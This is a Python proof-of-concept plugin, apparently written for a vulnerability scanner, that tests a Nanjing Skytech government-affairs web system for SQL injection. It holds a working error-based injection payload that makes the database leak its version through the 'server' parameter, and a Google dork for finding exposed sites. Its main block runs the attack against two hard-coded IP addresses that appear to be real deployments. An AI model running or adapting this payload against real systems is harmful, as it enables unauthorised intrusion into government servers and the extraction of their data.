#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 南京擎天政务系统SQL注入(七)
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2014-075253
description:
    index_page/geren_list_page.aspx?server=1&refid= POST parameter:server
google dork:
    inurl:geren_list_page.aspx
'''

import time
import re

def assign(service, arg):
    if service == 'skytech':
        return True, arg

def audit(arg):
    url = arg + 'index_page/geren_list_page.aspx?server=1%27and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--&refid='
    code, head, res, err, _ = curl.curl2(url)
    if (code != 0) and ('WtFaBcMicrosoft SQL Server' in res):
        security_hole('SQL Injection: ' + url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('skytech', 'http://58.222.202.135:81/')[1])
    audit(assign('skytech', 'http://61.178.185.50/mqweb/')[1])